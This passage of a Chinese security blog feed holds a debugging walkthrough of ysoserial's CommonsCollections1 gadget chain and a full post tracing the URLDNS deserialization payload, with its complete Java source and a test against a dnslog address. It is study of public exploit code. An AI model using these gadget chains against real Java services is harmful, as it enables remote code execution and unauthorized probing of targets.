class=\"markdownIt-Anchor\" href=\"#payload触发分析\">#</a> payload 触发分析</h2>\n<p>以下是 POC 中给出的触发链，可以根据 Gadget 下断点（这样比较清晰感觉）</p>\n<p>根据上面 payload 构造的学习，我们可以更好的理解该利用链的触发</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">\tGadget chain:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tObjectInputStream.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tAnnotationInvocationHandler.readObject()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tMap(Proxy).entrySet()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\tAnnotationInvocationHandler.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\tLazyMap.get()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\tChainedTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tConstantTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tClass.getMethod()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.getRuntime()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\tInvokerTransformer.transform()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\tMethod.invoke()</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\t\t\t\t\t\t\tRuntime.exec()</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tRequires:</span></span><br><span class=\"line\"><span class=\"comment\">\t\tcommons-collections</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br></pre></td></tr></table></figure>\n<p>首先从 PayloadRunner38 行进入反序列化</p>\n<p>其中 serialized 是我们序列化后的 payload</p>\n<p><img src=\"41.png\" alt=\"\"></p>\n<p>进入 ObjectInputStream#readObject</p>\n<p><img src=\"42.png\" alt=\"\"></p>\n<p>在 AnnotationInvocationHandler#readObject 处下断点，查看调用栈</p>\n<p>观察到在 ObjectInputStream 中通过反射调用了 AnnotationInvocationHandler#readObject</p>\n<p><img src=\"43.png\" alt=\"\"></p>\n<p>进入 AnnotationInvocationHandler#readObject</p>\n<p>此处 memberValues 为我们传入的代理对象 proxyMap</p>\n<p><img src=\"45.png\" alt=\"\"></p>\n<p>调用其任意方法，就会进入 AnnotationInvocationHandler#invoke</p>\n<p>这里要进入函数一直点点点，其中会多次返回该行</p>\n<p><img src=\"46.png\" alt=\"\"></p>\n<p>直到再次进入 AnnotationInvocationHandler#readObject，运行至 355 行进入函数，会跳转至 AnnotationInvocationHandler#invoke</p>\n<p><img src=\"47.png\" alt=\"\"></p>\n<p>查看当前函数调用栈</p>\n<p>handler1 的 readObject -&gt; 代理对象的 entrySet -&gt; handler2 的 invoke</p>\n<p><img src=\"48.png\" alt=\"\"></p>\n<p>构造 handler2 时，传入的 Map 对象就是我们构造好的 LazyMap</p>\n<p>此时只要有调用 LazyMap#get，就会执行 transform</p>\n<p>查看当前变量，this.memberValues 就是 LazyMap 对象</p>\n<p><img src=\"49.png\" alt=\"\"></p>\n<p>往下滑滑滑滑滑</p>\n<p>在 78 行找到 <code>this.memberValues.get(var4)</code>  啦</p>\n<p><img src=\"50.png\" alt=\"\"></p>\n<p>调试进入 LazyMap#get，其中当获取的 key 不存在时，会进入 if 代码块调用我们构造好的 transform</p>\n<p><img src=\"51.png\" alt=\"\"></p>\n<p>查看变量，执行的 transform 就是我们构造好的，会通过反射获取函数执行命令</p>\n<p><img src=\"53.png\" alt=\"\"></p>\n<p>查看函数调用栈，和分析中相同</p>\n<p><img src=\"52.png\" alt=\"\"></p>\n<p>调到这里就完成触发啦:happy:</p>\n<p>⭐碰见了很多奇奇怪怪的问题，比如根本不会跳进 LazyMap#get 中 if 中的代码块，或者还没到这就已经弹窗了，或者细调时根本不会弹窗… 困扰了我很久😪</p>\n<p>但是正常运行是没有问题的，所以我取消了所有除此之外的断点，查看函数调用栈和变量都 OK 了</p>\n<p>所以感觉应该是 debug 在实现自身功能时有影响到正常代码的触发，这里说明一下啦</p>\n<h1 id=\"哔哔哔口水总结\"><a class=\"markdownIt-Anchor\" href=\"#哔哔哔口水总结\">#</a> 哔哔哔口水总结</h1>\n<p>看 p 神的文章，一点一点仔细看了一遍</p>\n<p><img src=\"54.png\" alt=\"\"></p>\n<p>然后脑袋瓜子就糊了</p>\n<p><img src=\"55.jpg\" alt=\"\"></p>\n<p>然后就从 URLDNS 开始再看一遍</p>\n<p>然后发现哇塞</p>\n<p>URLDNS 真的好简单耶</p>\n<p>怎么会有人看不懂这么简单的原理呀不会把不会吧</p>\n<p><img src=\"57.jpg\" alt=\"\"></p>\n<p>然后看 cc1，把 payload 原理又看了一遍，什么 transform 也太简单了把，不就是这样吗，这有什么难度吗？？？</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>然后看触发原理调试的时候就是这样了 (beiwei)</p>\n<p><img src=\"59.png\" alt=\"\"></p>\n<p>由其是还碰见了调试上的问题</p>\n<p>左左右右调试了一两个星期把</p>\n<p><img src=\"60.jpeg\" alt=\"\"></p>\n<p>一直想把整个过程简洁优雅的总结出来，所以不断地总结总结，画图记笔记…</p>\n<p>因为能简单的把问题解释清楚才能证明自己是真的理解了（不然就和第一遍看 p 大文章的情况一样了）</p>\n<p>然后调完了理解了总结了记笔记了，我又行了</p>\n<p><img src=\"58.jpg\" alt=\"\"></p>\n<p>这也太简单了吧</p>\n<p>不会吧不会吧会难道还有人看不懂 cc1 吗</p>\n<p>以上作死的行为只是想提醒自己，很多很难的知识点一定要自己动手去试，多总结，一定要写文章记录下来（年纪大了真的会忘的），细节不要放过，一点一点抠</p>\n<p>我真的不是小天才，我只是个小神仙罢了，唉</p>\n<p><img src=\"61.gif\" alt=\"\"></p>\n<p>下图是在理解触发原理时自己写的一个大概的流程（尽量简洁但是不是很简洁）</p>\n<p>看不看得懂就看缘分了😴</p>\n<p><img src=\"60.png\" alt=\"\"></p>\n",
            "tags": [
                "Java反序列化"
            ]
        },
        {
            "id": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "url": "http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/",
            "title": "ysoserial之URLDNS调试",
            "date_published": "2021-08-25T03:38:45.000Z",
            "content_html": "<h1 id=\"利用链简述\"><a class=\"markdownIt-Anchor\" href=\"#利用链简述\">#</a> 利用链简述</h1>\n<ol>\n<li>触发结果为一次 DNS 请求，适用目标无回显情况</li>\n<li>使用 java 内置类构造，无第三方库依赖</li>\n</ol>\n<h1 id=\"urldns利用代码\"><a class=\"markdownIt-Anchor\" href=\"#urldns利用代码\">#</a> URLDNS 利用代码</h1>\n<p>poc：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> ysoserial.payloads;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.InetAddress;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLConnection;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URLStreamHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class=\"line\"><span class=\"keyword\">import</span> ysoserial.payloads.util.Reflections;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class=\"line\"><span class=\"comment\"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   This was inspired by  Philippe Arteau <span class=\"doctag\">@h</span>3xstream, who wrote a blog</span></span><br><span class=\"line\"><span class=\"comment\"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class=\"line\"><span class=\"comment\"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class=\"line\"><span class=\"comment\"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class=\"line\"><span class=\"comment\"> *   standard JDK classes.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class=\"line\"><span class=\"comment\"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class=\"line\"><span class=\"comment\"> *   during a comparison (either equals or hashCode).</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class=\"line\"><span class=\"comment\"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class=\"line\"><span class=\"comment\"> *   it to trigger a DNS lookup.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *   Gadget Chain:</span></span><br><span class=\"line\"><span class=\"comment\"> *     HashMap.readObject()</span></span><br><span class=\"line\"><span class=\"comment\"> *       HashMap.putVal()</span></span><br><span class=\"line\"><span class=\"comment\"> *         HashMap.hash()</span></span><br><span class=\"line\"><span class=\"comment\"> *           URL.hashCode()</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class=\"line\"><span class=\"meta\">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class=\"line\"><span class=\"meta\">@Dependencies()</span></span><br><span class=\"line\"><span class=\"meta\">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">URLDNS</span> <span class=\"keyword\">implements</span> <span class=\"title\">ObjectPayload</span>&lt;<span class=\"title\">Object</span>&gt; </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getObject</span><span class=\"params\">(<span class=\"keyword\">final</span> String url)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//Avoid DNS resolution during payload creation</span></span><br><span class=\"line\">                <span class=\"comment\">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class=\"line\">                URLStreamHandler handler = <span class=\"keyword\">new</span> SilentURLStreamHandler();</span><br><span class=\"line\"></span><br><span class=\"line\">                HashMap ht = <span class=\"keyword\">new</span> HashMap(); <span class=\"comment\">// HashMap that will contain the URL</span></span><br><span class=\"line\">                URL u = <span class=\"keyword\">new</span> URL(<span class=\"keyword\">null</span>, url, handler); <span class=\"comment\">// URL to use as the Key</span></span><br><span class=\"line\">                ht.put(u, url); <span class=\"comment\">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                Reflections.setFieldValue(u, <span class=\"string\">&quot;hashCode&quot;</span>, -<span class=\"number\">1</span>); <span class=\"comment\">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">return</span> ht;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">final</span> String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">                PayloadRunner.run(URLDNS.class, args);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class=\"line\"><span class=\"comment\">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class=\"line\"><span class=\"comment\">         * using the serialized object.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         *</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class=\"line\"><span class=\"comment\">         * second resolution.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SilentURLStreamHandler</span> <span class=\"keyword\">extends</span> <span class=\"title\">URLStreamHandler</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> URLConnection <span class=\"title\">openConnection</span><span class=\"params\">(URL u)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">synchronized</span> InetAddress <span class=\"title\">getHostAddress</span><span class=\"params\">(URL u)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>链接：<a href=\"https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java\">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>\n<h1 id=\"调试分析\"><a class=\"markdownIt-Anchor\" href=\"#调试分析\">#</a> 调试分析</h1>\n<p>项目链接：<a href=\"https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>\n<p>打开 idea，找到 URLDNS 入口：ysosertial-&gt;src-&gt;main-&gt;java-&gt;ysoserial-&gt;payloads-&gt;URLDNS.java-&gt;main ()</p>\n<h2 id=\"运行尝试\"><a class=\"markdownIt-Anchor\" href=\"#运行尝试\">#</a> 运行尝试</h2>\n<p>直接运行 main 函数，发现默认传入的命令为 calc.exe</p>\n<p>报错：URL 初始化失败，找不到 calc.exe 协议</p>\n<p><img src=\"1.png\" alt=\"\"></p>\n<p>最后一行报错信息指向 main 函数，倒数第二行报错信息指向 PayloadRunner</p>\n<p>说明为传入参数 args 有误，应为 URL，也是我们要发送请求的地址</p>\n<p>打开 dnslog，获取到地址为：<a href=\"http://ghtzjz.dnslog.cn\">ghtzjz.dnslog.cn</a></p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>编辑传入参数，<a href=\"http://ghtzjz.dnslog.cn\">http://ghtzjz.dnslog.cn</a></p>\n<p><img src=\"3.png\" alt=\"\"></p>\n<p><img src=\"4.png\" alt=\"\"></p>\n<p>再次运行 main ()，payload 为我们传入的参数</p>\n<p><img src=\"5.png\" alt=\"\"></p>\n<p>刷新 dnslog 的请求记录，发现接收到了请求，利用成功</p>\n<p><img src=\"6.png\" alt=\"\"></p>\n<h2 id=\"代码调试\"><a class=\"markdownIt-Anchor\" href=\"#代码调试\">#</a> 代码调试</h2>\n<p>我们从 main 函数一步一步调试，会发现 URLDNS 在 main 中调用 PayloadRunner#run ()</p>\n<p>然后 PayloadRunner#run () 中调用 URLDNS#getObject ()</p>\n<p>URLDNS#getObject () 中的 HashMap <strong>ht</strong> 就是我们要生成的（未序列化）payload</p>\n<p><img src=\"13.png\" alt=\"\"></p>\n<p>getObeject 方法中，创建了一个 URL 对象（存储我们输入的 dns 地址）–&gt; 再将 URL 对象放入 HashMap 中</p>\n<p>下面一行的注释写道，在上面的 put 过程中，计算并缓存了 URL 的 hashCode; 这将重置它，以便下次调用 hashCode 时将触发 DNS 查找</p>\n<p>那么在 ht.put 时，我们进入 HashMap 查看，发现 key 进行了 hash 计算</p>\n<p>（这里插播一条小道消息，点击这个调试可以返回上一步<img src=\"14.png\" style=\"zoom:90%;\" />)</p>\n<p><img src=\"15.png\" alt=\"\"></p>\n<p>在这里就是我们的 URL 对象进行了 hash 计算</p>\n<p>hash 计算前的 URL 对象：</p>\n<p><img src=\"16.png\" alt=\"\"></p>\n<p>hash 计算后的对象（就是对象中的 hashCode 变量发生了变化嘛）：</p>\n<p><img src=\"19.png\" alt=\"\"></p>\n<p>进入下一行代码，Reflections.setFieldValue 是什么呢？</p>\n<p>看名字就是一个通过反射设置成员变量值的功能😀</p>\n<p>进入函数内部，是要设置传入对象的成员变量 hashCode 的值</p>\n<p><img src=\"17.png\" alt=\"\"></p>\n<p>查看变量值，传入对象是包含 payload 的 URL 对象，要将它的 hashCode 值设置为 - 1</p>\n<p><img src=\"18.png\" alt=\"\"></p>\n<p>执行完这行代码，发现变量 u 和 ht 中存储的 URL 对象的 hashCode 值都变为 - 1 了</p>\n<p><img src=\"20.png\" alt=\"\"></p>\n<p>然后返回 ht，也就是更改过存储 key 的 hashCode 值的 HashMap</p>\n<p>再次进入 PalodRunner#run，返回的 HashMap 赋值给 objBefore，再将其序列化赋值给 ser</p>\n<p><img src=\"21.png\" alt=\"\"></p>\n<p>Utils.releasePayload (payload, objBefore) 应该是释放资源的代码（不用在意，和最后返回值无关）</p>\n<p>最后返回 ser，即将 ser 值赋给变量 serialized，所以 serialized 就是序列化后的 payload</p>\n<p><strong>终于！开始反序列化触发漏洞了！</strong></p>\n<p>从这里进入反序列化函数</p>\n<p><img src=\"22.png\" alt=\"\"></p>\n<p>代码注释中说明，<strong>利用链从 HashMap#readObject () 进入，直到进入 URL#hashCode () 触发 DNS 请求</strong></p>\n<blockquote>\n<p>Gadget Chain:</p>\n<ul>\n<li>\n<pre><code>HashMap.readObject()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.putVal()\n</code></pre>\n</li>\n<li>\n<pre><code>HashMap.hash()\n</code></pre>\n</li>\n<li>\n<pre><code>URL.hashCode()\n</code></pre>\n</li>\n</ul>\n</blockquote>\n<p>那我们就一直点点点直接看见 readObject</p>\n<p>好了过了没看见嘤嘤嘤</p>\n<p>直接去 Hash#readObject 处下个断点</p>\n<p><img src=\"23.png\" alt=\"\"></p>\n<p>往下翻翻就会看见一段代码，又看见了熟悉的单词，hash</p>\n<p><img src=\"24.png\" alt=\"\"></p>\n<p>根据利用链我们可知触发漏洞的 hashCode () 就在 hash () 中，我们进入该函数</p>\n<p><img src=\"25.png\" alt=\"\"></p>\n<p>到达 URL#hashCode，果然其中有 key.hashCode ()</p>\n<p>因为我们在构造 payload 时将 hashCode 赋值为 - 1，所以不会进入 if 而是执行下面的代码</p>\n<p>调用 URLStreamHandler#hashCode</p>\n<p><img src=\"26.png\" alt=\"\"></p>\n<p>进入 URLStreamHandler#hashCode</p>\n<p>根据 p 神的文章所言，getHostAddress 中有一行代码</p>\n<blockquote>\n<p>InetAddress.getByName(host) ;</p>\n</blockquote>\n<p>其作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询，整个触发过程就已经完成啦</p>\n<p><img src=\"27.png\" alt=\"\"></p>\n<p><img src=\"28.png\" alt=\"\"></p>\n<p>后面继续跟进就是地址的具体查询过程了，无了无了</p>\n<p>下图是漏洞触发的调用栈</p>\n<p><img src=\"29.png\" alt=\"\"></p>\n<h1 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h1>\n<p><strong>payload 构造</strong></p>\n<p>将我们输入的 dns 地址存储在 URL 对象中 -&gt; 将 URL 对象作为 key 存储在 HashMap 中 -&gt; 由于作为 key 值，在 put 时会进行 hash 计算，那我们就通过反射更改其 hashCode 值为 - 1</p>\n<p><strong>漏洞触发</strong></p>\n<p>反序列化 HashMap 时，会调用 hash () 计算 key 的 hash 值 -&gt; 计算时，调用 (URL 对象) key#hashCode () -&gt; 由于我们将该对象的 hashCode 值设置为 - 1，所以会调用 handler.hashCode () -&gt; 其中获取地址的代码， <code> InetAddress addr = getHostAddress(u);</code>  实际上就是一次 DNS 查询</p>\n<p><strong>小彩蛋</strong></p>\n<p>在构造 payload，ht.put () 时，由于 URL 的 hashCode 值为 - 1，所以同样会调用 handler.hashCode () 触发 DNS 查询，可是为什么我们只能获取到一条 dns 查询记录，而不是两条呢？</p>\n<p>直接在 DNS 查询处下断点</p>\n<p>生成 payload 时，进入 URLStreamHandler#hashCode 查看当前变量</p>\n<p><img src=\"31.png\" alt=\"\"></p>\n<p>反序列化时，进入 URLStreamHandler#hashCode 查看当前变量</p>\n<p><img src=\"32.png\" alt=\"\"></p>\n<p>可以发现获取到的 addr 有值了，为 <code>域名/127.0.0.1</code></p>\n<p>那么同样是将 <code>http://ysmzza.dnslog.cn</code>  传入 <code>getHostAddress(u)</code>  得到的结果却不一样呢？</p>\n<p>那么我们再进入 <code>getHostAddress(u)</code>  进行对比</p>\n<p>构造 payload 进入 <code>getHostAddress(u)</code>  时，如下图</p>\n<p><img src=\"33.png\" alt=\"\"></p>\n<p><img src=\"34.png\" alt=\"\"></p>\n<p>这里调用的 SilentURLStreamHandler#getHostAddress 直接返回的 null</p>\n<p>注释:</p>\n<blockquote>\n<p>这个 URLStreamHandler 实例用于在创建 URL 实例时避免任何 DNS 解析。 DNS 解析用于漏洞检测。重要的是不要在使用序列化对象之前探测给定的 URL。潜在的误报：如果首先从测试计算机解析 DNS 名称，则目标服务器可能会获得缓存击中第二个决议。</p>\n</blockquote>\n<p>而在我们反序列化后进入 <code>getHostAddress(u)</code> ，URL 对象中的 handler 就是默认的 handler 了，因而会触发 DNS 查询</p>\n<p>所以 POC 中定义 URLStreamHandler 内部类，避免生成 paayload 时进行 DNS 解析（其实看注释就能看到，但我一开没有看到这里的代码 (๑・́ωก̀๑)  ）</p>\n<p><strong>小问题</strong></p>\n<ol>\n<li>\n<p>漏洞是通过 URLStreamHandler#hashCode 触发的，那么这个 handler 是啥玩意？</p>\n</li>\n<li>\n<p>new URL 对象时，一定要传入 handler 才能触发漏洞吗？如果不传入 handler，程序还能正常运行吗？（因为 HashMap#put 时会调用 URLStreamHandler#hashCode）会有默认的 handler 给我们调用吗？</p>\n</li>\n</ol>\n<p>查查 API</p>\n<blockquote>\n<p>抽象类 <code> URLStreamHandler</code>  是所有流协议处理程序的通用类，流协议处理程序知道如何为特定协议类型建立连接，如 <code>http</code>  或 <code>https</code> 。</p>\n<p>在大多数情况下，  <code>URLStreamHandler</code>  子类的实例不是由应用程序直接创建的。  更确切地说，在第一时间构建时的协议名称遇到 <code>URL</code>  ，适当的流协议处理程序被自动加载。</p>\n</blockquote>\n<p>所以流协议程序用于为协议建立连接，并构建时的协议名称遇见 URL 时，适当的流协议处理程序被自动加载</p>\n<p>所以其实不传入 handler，URL 对象也会自动加载 handler</p>\n<p>由小彩蛋的内容可知传入自定义的 handler 只是为了在生成 payload 时不进行 dns 解析</p>\n<h2 id=\"调试遇到的问题未解决\"><a class=\"markdownIt-Anchor\" href=\"#调试遇到的问题未解决\">#</a> 调试遇到的问题（未解决）</h2>\n<p>在尝试代码调试时，发现无法启用 debug</p>\n<p><img src=\"7.png\" alt=\"\"></p>\n<p>看第一行，运行的是 jdk8_32，而我的 idea 是 64 位的，估计是不一致导致的问题（以前经常碰见 tomcat 和 jdk 不一致导致的问题）</p>\n<p>在上方菜单栏 file-&gt;project structure 中可以设置 jdk 版本，更改为 64 位 jdk</p>\n<p><img src=\"8.png\" alt=\"\"></p>\n<p>然后就会报错，程序包 sun.rmi.server 不存在</p>\n<p><img src=\"9.png\" alt=\"\"></p>\n<p>但是在使用 jdk8 运行程序时并没有该错误，ctrl+click 点击进入报错程序包，是可以找到在 java 原生库中的</p>\n<p><img src=\"10.png\" alt=\"\"></p>\n<p>也就是说在编译程序的 classpath 中没有包含’sun.rmi.server’这个包</p>\n<p>我的直觉告诉我是版本的问题，可是上图中 jdk11 的包里面也有这个包的并且已经引入项目中了</p>\n<p>所以我换回 jdk8_32，查看 jar 包的区别</p>\n<p>jdk8：</p>\n<p><img src=\"11.png\" alt=\"\"></p>\n<p>jdk11:</p>\n<p><img src=\"12.png\" alt=\"\"></p>\n<p>难道这个世界有些东西我真的，难以探寻吗，这真的就是我的极限了吗，不，我要去百度！！百度救我！！！</p>\n<p><strong><a href=\"https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7\">这里发现</a>，jdk11 不再提供 corba 工具，rmic (RMI 编辑器) 不再支持 - idl 或 - iiop 选项。</strong></p>\n<p>可是 java11 的 api 里面是有 rmi 的🙁</p>\n<p>果然换成 jdk8_64 所有问题迎刃而解，那么这个问题…</p>\n<p>当然不能算解决了，未完待续！</p>\n",
            "tags": [
                "ysoserial调试"
            ]
        },
        {
